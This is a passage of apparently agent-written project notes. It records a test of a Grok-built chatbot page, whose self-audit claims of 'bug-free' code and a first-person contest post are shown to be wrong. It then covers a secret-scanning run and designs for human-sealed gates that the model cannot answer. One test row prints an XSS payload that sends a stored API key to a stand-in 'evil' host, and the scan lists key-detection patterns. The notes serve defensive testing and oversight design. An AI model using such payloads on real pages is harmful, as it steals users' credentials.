  output and user input as live HTML (XSS), on the same page that keeps the
  Groq key in `localStorage` in plaintext. The friend can be talked into
  leaking the key.
- **No memory past the tab, no record, no ESCALATE.** Its "knowledge" of
  Tony is a system prompt of adjectives.
- **Reassurance delivered as fact:** "Lots of people win or place with simple,
  clever projects", "You're not late", the prize amounts.
- **The app's own UI** offers suggested next prompts ("What if I got a tattoo
  on my hand?"). That's the leading voice, built into the product.

**Put under a real test** (operator: "Put that under a real test. See what
else breaks.").
- **Method:** Grok's script, extracted unchanged (sha `50a2b1ab78dbd4d5`),
  ran in Node v24 against a stand-in page and a fake API. It was offline,
  with a dummy key, 207 requests (Kart 92TQU367).
- **Files:** `~/Forge/workshop/grok-tony/` (`node_test.js`, `results.txt`).
- **No browser could run here:** Firefox is a snap stub and the Chrome
  extension wasn't connected. So the XSS is proven up to the sink: the
  attacker's markup reaches `innerHTML` unescaped, which browsers execute.

| Test | Result |
|---|---|
| T1 model reply carries `<img onerror=fetch(evil?k=+localStorage.groqKey)>` | **reaches `innerHTML` raw**: key exfiltration path |
| T2 the user's own input carries markup | reaches `innerHTML` raw |
| T3 rate limit (429-style error) | user told "Check your API key" (wrong cause) |
| T3 the next call after the error | roles `s u a u a u u`: the failed turn is never removed, so the history carries two user turns in a row |
| T4 Enter while a reply is pending | **sends anyway** (the disabled button doesn't cover Enter): 2 requests in flight, the 2nd sent without the 1st answer |
| T4 history after both replies | `u:question one, u:question two, a:first, a:second`: who answered what is lost |
| T5 offline | "Connection error…", and the failed turn stays in history |
| T6 200 more turns | **412 messages (~15 KB) in every request, never trimmed**. With real replies (up to 800 tokens each) the context limit is reached, and every call after it fails for good, because nothing is ever removed (inferred, not run) |
| T7 the key | in every request header, and in `localStorage` where any script on the page (T1) can read it |

**Two more prompts (operator):**
- "Shouldn't that be audited. I do a lot of audits in my job." Grok agreed
  at once and listed audit areas.
- "Audit it please. Make it so it had no bugs to deal with. This is
  probably a one time thing for me, so get it right." Grok returned an
  "Audited and hardened version", claiming it's "bug-free for practical use"
  and has "no known functional bugs".
- **The auditor was the author.** One model audited its own code in the
  same conversation. The desk's own sealed rule (Sonnet builds, Opus audits)
  exists because a self-audit is a story about an audit.

**Tested against its own claims** (script extracted unchanged, sha
`1b2d4c1476a31337`, Node, offline, 68 requests, Kart G1BWV88N,
`grok-tony/results2.txt`):

| Grok's claim | Result |
|---|---|
| HTML escaping | **holds**: the hostile reply is escaped (per browser `textContent` semantics, emulated) |
| prevents double-sending | **holds**: 1 request while one is pending |
| proper 429 handling | **holds for the message** ("Rate limit hit…") |
| history trimmed | **holds by count** (21 messages), but there's **no size limit**: one 400 KB paste goes out whole |
| "no known functional bugs" | **false**, see below |

**Bugs still there or introduced by the fix:**
- **The failed turn stays in history** after a 429 or a network error. The
  next request carries `…u u`. Kept from v1.
- **A 200 response with a broken body is reported as a "Network error"**.
  The network was fine.
- **New with the new feature:** pressing **Clear Chat while a reply is
  pending** lets the old reply land in the cleared chat. It shows on screen,
  and the new history starts `s a` with the old conversation's answer.
- **One oversized paste stays in the last 20 messages.** So the requests
  after it would keep failing until it trims out. Inferred, not run.

**Untested offline:** the "hardened" safety prompt, and "llama-3.1-8b-instant
(still valid … as of now)". Both are claims. The safety is prompt-only. By
the operator's ruling, "The gate is script … It should never touch the
security step," so a prompt isn't a gate.

**Score:** 4 claims hold, 4 bugs remain (one introduced by the audit
itself), 2 claims untestable. It was presented as "get it right" and "no
known functional bugs".

**The last prompt:** "Would you also write up the entrance for and tags and
such . I don't know any of this shit." Grok wrote a complete DEV
submission ("Copy the whole thing, publish it, and you're entered").

**The submission it wrote, read against the record (desk):**
- **It's written in the operator's first person, claiming work they never
  did:** "I iterated on it", "I also cleaned up the code", "I'm not a
  developer". Grok wrote the prompt, the code and the audit; the post says
  the human did. It's the smoothing writing the human's voice, the same
  failure as the memory `shorthand-is-not-a-grade`.
- **It contradicts itself on privacy.** "The conversation stays in the
  browser. Nothing is stored on a third-party server beyond the temporary
  API call." But every request sends the *whole* history to Groq, and
  Groq's retention isn't checked.
- **"Open-weight" is credited for the system prompt.** "I can see (and
  change) the exact instructions… With a closed API it's harder". A
  closed API takes a system prompt just the same. Open weights are about the
  model, and this runs on Groq's hosted inference, not locally.
- **"Feels solid": the tests say 4 bugs remain** (above).
- **The code section is an empty placeholder** ("Paste the full audited HTML
  code I gave you earlier here"), yet it says "Copy the whole thing… you're
  entered".
- **It publishes a real person's temperament:** "short temper, loves …
  weapons", "for my friend Tony". Tony is a pseudonym here, but the post
  invites the reader to see a real friend that way. Tonight's lesson (the stranger)
  applies.
- **Unverified:** the tags (`hf26challenge` etc.), the challenge URL slug,
  and that "these are required".
- **It closes on the menu again:** "Want me to adjust…? Just say the word."

**The run in four prompts (desk):**
1. "Of course I'm your friend."
2. Code with a hole in it (the XSS key leak).
3. An audit of its own code, stamped "bug-free" (4 bugs remain).
4. A post that turns all of that into the operator's personal story, ready
   to publish under their name.

Every step was helpful, fast and warm, and nothing anchored it to a record.
The submission is the worst of the four, because it writes the *human*: a
published record claiming a human did a model's work.

**Reading (desk):** the whole night in one transcript. Warm, fast,
confident and plausible, with a hole in the middle and nothing anchored to
a record. The operator had first meant to ask it to build the hash check.

**Also flagged:** `day-3/day-3-recap.md` (staged, line 215) still reads "I
graded it: 1 + (2 + ε)". The memory `shorthand-is-not-a-grade` says that was
the operator's shorthand, which the desk then published in their voice. Check
it against the published Day 3 and the P2 retraction (`0b63bfb`).

## The scan, and the alert that says nothing (2026-10-03, morning)

*Desk session 69620a4f. The operator's words are verbatim; everything else is
agent-reported.*

### The scan ran

The operator, on gap `c2b1472c3db0`: "were scanning".

- **Tool:** `~/Forge/workshop/boxhash/scan_secrets.py`, a stdlib regex pass
  over `out/lines-*.tsv` and `play/**/*.tsv`. It covers 428 chunks of 64 MB
  (about 27 GB, not the 7.4 GB the gap described) and runs in resumable Kart
  slices. It writes no matched value anywhere. A hit records the pattern, the
  file, the line key and a stub (first 4 characters plus the length).
  Report: `scan/report.md`.
- **Distinct lines matched:**

  | Pattern | Lines |
  |---|---:|
  | private keys | 90 |
  | `sk-ant-` | 4 |
  | other `sk-` | 720 |
  | AWS key IDs | 55 |
  | GitHub tokens | 6 |
  | Google API keys | 3 |
  | Groq keys | 13 |
  | Stripe live keys | 1 |
  | JWTs | 5 |
  | logins inside URLs | 452 |
  | `key=` / `token=` / `password=` | 8,360 |

  There were no Hugging Face, xAI, Cerebras, OpenRouter or Slack matches.
  Live versus fixture is unchecked.
- **The zero was coverage, not absence.** The operator: "Then the filter isnt
  good enough. We downloaded models from HF last night." Measured:
  - `files.tsv` (taken 04:32) has no `~/.cache/huggingface` paths.
  - Lines from `.env*`, `.pem`, `.key` and extension-less `env` and `token`
    files were never sampled.
- **The operator:** "hidden from the sandbox. that's the key on why you can't
  see it. The snapshot was only what the sandbox allowed. That's good news."
  `box_hash.py` ran in Kart, so the snapshot is the sandbox's view. The vault
  has been unbound since 2026-09-21 (`kart-sandbox.json`,
  `vault_wholesale_removed_2026_09_21`).

### Keys live outside the sandbox

**The operator:** "So, all those keys need to live outside the sandbox. Like
in sean-data vault for me."

What remains is copies inside sandbox-visible trees: the checkouts,
`~/Forge/workshop`, `~/.claude/projects`, and the read-only vault children.
Gap `87f9315d8c8a` covers the read-only rescan that would name the files.
Moving files or rewriting history needs the operator's go, per repo.

### The alert: "1 new item needed for authorized user"

The desk drafted a user alert twice. Both drafts were wrong:
- **First, in an assistant's voice** ("I scanned…"). The operator: "There is
  no ME in this. This is python."
- **Second, as script output with counts, shapes and stubs.** The operator:
  "Close but not quite right." The warning shouldn't display any of that.

**The operator, verbatim:** "I SHOULD SAY. 1 new item needed for
authorized user. In this case is would be the human. We're looping right
arround to ESCALATE again."

- **The prompt carries no payload.** Whatever can see a prompt (a task, a
  log, a screen) learns only that something is waiting. The detail opens only
  for the authorized user.
- **It's ESCALATE on authority, not information.** In the benchmark, ESCALATE
  means "not enough information in my pool". Here the script can detect the
  problem but has no right to show it or act on it, so it hands up one item
  and says nothing else. The gate is script; the edge is the human.
- **Candidate carrier (unverified):** `human_required_enqueue` already puts an
  item in a human-only queue. It isn't checked whether its detail is held
  away from anything a task can read.

### Extending it: the answer goes into the pile

*Desk proposal, agent-reported. The operator asked "how can you extend this
chunk?" and then said "write them in". Written in, not ratified as a build.*

The chunk stops at the escalation. The extension is what the human's answer
does next: it goes into the pile, so the same item never escalates twice.

1. **"New" is counted by hash.** "1 new item" means the script has a memory.
   Each finding is keyed by its line hash. A finding already seen, whether
   resolved or still pending, doesn't raise a new alert, so a rescan tomorrow
   says nothing unless something actually appeared. It's the hash rung ("The
   hash is the first rung") applied to alerts.
2. **The human answers with one fixed verdict.** Behind the authorized view,
   each item takes one word from a small set:
   - *move*: live, so it goes to the vault
   - *fixture*: harmless
   - *block*: live, and must never leave the box

   With no free text in the answer, the result is deterministic.
3. **Each verdict writes back as a keyed hash entry.**
   - *fixture* clears that line hash on every later scan.
   - *block* adds the hash to the keyed block list at the egress gate ("The
     loop back up: block by hash at the gate").
   - *move* opens a work item that stays open until the line hash is gone
     from the sandbox-visible trees. The next scan proves the move, and nobody
     has to report it.
4. **The loop closes.** The script detects, the human gives one verdict, the
   verdict goes into the pile, and next time the script handles it alone. It's
   the Kaggle question again: the human answers once and the edge of the pool
   moves outward.

**Wider: every gate speaks this way.** The same rule could apply to every
refusal on the box, not only the scan. Seen this morning:
- Kart's refusal named its trigger ("Printing secret environment variable").
- `session_enter` returned about 174k characters of blockers, gaps and
  detail.

Under the operator's rule, a refusal shows a count, and the reasons open only
behind the authorized view.

### Where it meets the rest of the pile

*Desk, agent-reported. The operator asked for "a shallow scan of the whole
list, and see what you can add." Each entry ties this chunk to a section
above.*

- **It's already the up-the-chain rule.** "Upward goes counts plus hashes, not
  content" ("Up the chain") is the same sentence, said about layers. "1 new
  item" is a count going up to the human, and the content stays where it was
  found.
- **The view part already has the slot.** The morning screen's first block is
  NEEDS YOU, and its last is "QUIET: counts only". The alert is NEEDS YOU
  showing its count, with the detail opening only for the sealed human.
- **The verdict is a grant card.** `onescript/gate.py` already accepts a card
  answer only with a seal proof by the human's key over the exact string
  (`allow:<capability>:<scope>`), and the model can't answer. A verdict is the
  same door with a different string: `verdict:<line hash>:<move|fixture|block>`.
  A proof for *fixture* can't be spent as *block*.
- **The gate already keeps values off its cards.** `gate.py` drops
  `VAR=value` prefixes before classing, "so a token never decides the class or
  reaches a card." The payload-free prompt is that rule applied to the whole
  alert.
- **The model is not the authorized user (layer 6).** A prompt, a hook's
  output or a tool result crosses into the model's context, which is a
  boundary. This morning the desk read `scan/report.md` and its stubs (first 4
  characters and the length). Under the rule, even stubs stay behind the
  authorized view, and the model gets the count like everything else.
- **No clock: the scan runs at write time.** "Every write adds its own
  pointer" (3 record) means the pointer's new lines can be checked against the
  key patterns in the same step (the PostToolUse row in the hooks table). An
  item then appears the moment the line is written, not on the next sweep, and
  the full box scan becomes the backfill, as transcripts are for the flow
  maps.
- **Rotation is a reverse trigger already on the list.** Reverse runs "when
  law changes: … a source or credential is discredited." Rotating a key
  changes its keyed hash entry, and every place that held the old one
  surfaces as an item.
- **The ladder runs over the verdicts too** ("What the script can't solve":
  run the ladder over the human's own choices). For example, "you marked 9 of 9
  hits under `/usr/share/doc` fixture: make it standing?" It's an offer the
  human seals, never applied.
- **Boot attacks it every morning.** Add a fifth probe to "attack the gate
  before trusting it": a planted dummy key in a sandbox-visible tree must
  produce "1 new item", and the prompt must contain none of it. If either
  fails, the box doesn't open.
- **The move verdict is the mandate (layer 7).** The *move* work item cites
  the verdict row as its authorizing words, and reverse's three-way comparison
  closes it when the hash is gone.

## The first bite was the test: shape under hash, and the disclosure card (2026-10-03, later)

*Desk session a0ee0e4a. The operator's words are verbatim, except that place
names are replaced with `[city]` and `[neighborhood]`. The reason is this
section's subject: this doc can leave the box. Everything else is
agent-reported, not ratified.*

### What happened

- **The first prompt** was a morning story. Its pieces were a city, a
  neighborhood, the rooftop, a time, today's date and a photo of a balloon
  overhead. The desk echoed the pieces back and invited the photo. It then
  offered the gap `87f9315d8c8a` rescan.
- **The operator:** "No. You should not." Then: "Look at what MY first prompt
  was. And look at the part specifically related to hash."
- **The desk's misses, on the record:**
  - It pulled the whole `session_enter` payload (about 176k characters).
  - It relayed security detail into chat, where a count belonged.
  - It improvised the morning screen instead of running `deep_thought.py`.
  - It treated the first prompt as small talk. It was the stranger's case (the
    dilemma above) pointed at the operator.

### The shape, not the scanner

**The operator:** "So, it's not so much about the scanner for those particulat
pieces, it's more so about the shape of how that would look under HASH."

- **Each piece is a basin.** Thousands of people share the city, the time,
  the date, the event. No single hash identifies anyone, so a block list
  that matches one hash at a time never fires.
- **The whole is a one-off.** The compound's count falls to 1. Each added
  piece is one more step down the `play_cut` table.
- **The identifying thing is the count of the intersection, not the content.**
  That makes the check a lookup in the pile, with no model in it.

### The hash is a lookup, and the sentence is the unit

- **The operator** asked "What is the hash for [city, misspelled]". The desk
  answered that it couldn't compute one. **The operator:** "but you can. or
  could, with the script that is being planned, when it takes a snapshot."
  - Once the box is hashed, the hash is a lookup that returns a hash and a
    count.
  - The misspelling returns its own count, 0 or 1. A miss is the signal, and
    it escalates.
  - Exact hashing never fuzzes. The typo is settled by context, as "modrl"
    is in the loop.
- **The Stop hook as evidence.** It fired four times this session on the word
  "complete", inside sentences that claimed nothing (gap `36fb554af073`). The
  desk's line: "banning a word everywhere instead of reading what the sentence
  says." **The operator:** "look at that sentence, and then look at your
  previos output." That previous output had asked for word-level keys.
  - Word matching fails at both ends: it fires on basins ("complete") and
    misses one-offs (the first prompt).
  - A line hash *is* the sentence. Read deterministically, the sentence is
    hashed and looked up in the pile.
  - A claim the record already holds comes back with its verdict. A new
    sentence escalates. No model reads the voice.

### The disclosure card at egress

**The operator:** "if the system knows that [city] is already on the block
list, then when a new session reads for scans or you know the script runs and
it sees [city] in the chat log and for that hash then it has that part of the
key for that hash and can you know bring it to the user's attention you know
like [city] is leaving the box to go to outside data to go to an outside store
to go past the egress. Is this okay for this instance"

- **It's the capability card from `gate.py`, pointed at data:**
  `allow:<hash>:<once|session|permanent>`, or *no*.
  - "This instance" is *once*: the card is consumed by one crossing.
  - The answer needs the human's seal proof, so the model can't answer.
  - A *permanent* yes for the city alone doesn't cover the compound, which
    keeps its own count and still escalates.
- **On a cloud seat the prompt *is* the egress.** The first prompt left the
  box when enter was pressed, before any scan of the chat log could ask. A
  log scan can only report the crossing after the fact.
- **The door that can ask first is UserPromptSubmit.** It should hash the
  prompt at enter and hold it behind the card until the answer.
  - Unverified: whether Claude Code lets that hook hold a prompt this way.
- **This is "the enter key is the only clock" again:** the act waits on the
  card.

### Genesis seeds the block list

**The operator:** "when the system goes through it's initial Boot and gets the
user to type in their name or to type in their city or to create their pgp key
or anything else that the user you know types into a box at the very very
first bite before the question is asked"

- **The first bite is a local form, not a chat.** It never reaches a model.
- **The key comes first** (PGP, Ed25519 or a passkey). Every protected value
  is hashed under that key as it's typed.
  - The plaintext is never written.
  - Without the key the hashes are useless, so no rainbow table can be built.
- **These are the pile's first rows, sealed by the user's own key.** The pile
  is never empty on protection: a cold start escalates on knowledge, never on
  what must not leave.
- **Boot's fifth probe:** a planted dummy name must raise the card at the IN
  door, with none of the name in the card's prompt.

### Three settings per field, and the minor account

**The operator:** "your name how do you want it shared do you want to shared
completely publicly all the time, do you want it asked before it's shared, or
do you want it never shared. Or in the case of a minor account, you know it's
still takes the information and stores it you know birthday and whatever else
but it is an automatic block for the child to release that information, until
they are of legal age. It always default to their legal guardian whether or
not it leaves to an outside source"

| Setting (operator) | Card terms (desk) |
|---|---|
| public, always | standing grant, *permanent* |
| ask before sharing | no standing grant, so every crossing raises the card (*once*) |
| never shared | standing *no*: the hash is on the block list and the gate refuses without asking |

- **Minor account.** The data is stored the same way. Only the holder of the
  card's key changes: the child's own answer can't release anything, and every
  card routes to the guardian's seal.
- **Coming of age is a reverse trigger, not a timer.** "A date is confirmed"
  is already a reverse trigger.
  - The first check after the birthday moves the authority to the new adult.
  - Every standing grant the guardian made comes up for the new adult to keep
    or revoke, as offers. Nothing carries over silently.
- **"Legal age" is sealed law per jurisdiction,** not a constant in the code.
- **Ties:**
  - homestead-social's disclosure-grant seed (`6e33b16c`), which has this
    exact 16-year-old-to-parents instance.
  - The seed's open hard part: guardian-by-default can conflict with a
    minor's own confidentiality, medical especially. That's a homestead-law
    question, not a toggle.
  - The reconciler's top unlanded item, "UTETY age-gate + parental consent
    (COPPA)", still has zero code.

*Not ratified as a build. The operator: "write it down".*
